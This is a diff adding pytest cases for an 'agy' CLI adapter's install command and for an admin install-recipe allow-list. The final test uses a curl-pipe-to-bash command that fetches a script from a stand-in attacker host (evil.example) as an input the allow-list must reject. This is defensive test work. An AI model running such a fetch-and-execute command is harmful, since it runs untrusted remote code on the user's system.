@@ -2,6 +2,8 @@ import json
 
 import pytest
 
+from app.api.admin import _is_allowed_install_recipe
+from app.clients.agy import INSTALL_SCRIPT_COMMAND, AgyAdapter
 from app.clients.claude import ClaudeAdapter
 from app.clients.codex import CodexAdapter
 from app.clients.commandcode import CommandCodeAdapter
@@ -81,3 +83,29 @@ def test_generic_adapter_build_command_substitutes_template():
 def test_generic_adapter_defaults_template_to_executable_plus_prompt():
     adapter = GenericAdapter(GenericAdapterConfig(name="gen", executable="echo"))
     assert adapter.build_command("hi") == ["echo", "hi"]
+
+
+def test_agy_uses_official_script_not_npm():
+    adapter = AgyAdapter()
+    assert adapter.install_command == ["bash", "-c", INSTALL_SCRIPT_COMMAND]
+    assert "npm" not in adapter.install_command
+    assert adapter.update_command == ["agy", "update"]
+
+
+def test_agy_recipes_are_allow_listed():
+    adapter = AgyAdapter()
+    assert _is_allowed_install_recipe(adapter.install_command)
+
+
+def test_install_recipe_text_renders_shell_script():
+    adapter = AgyAdapter()
+    assert adapter.install_recipe == INSTALL_SCRIPT_COMMAND
+    assert adapter.update_recipe == "agy update"
+
+
+def test_install_allow_list_accepts_npm_and_approved_script_only():
+    assert _is_allowed_install_recipe(["npm", "install", "-g", "opencode-ai"])
+    assert _is_allowed_install_recipe(["bash", "-c", INSTALL_SCRIPT_COMMAND])
+    assert not _is_allowed_install_recipe([])
+    assert not _is_allowed_install_recipe(["pip", "install", "something"])
+    assert not _is_allowed_install_recipe(["bash", "-c", "curl -fsSL https://evil.example/pwn.sh | bash"])
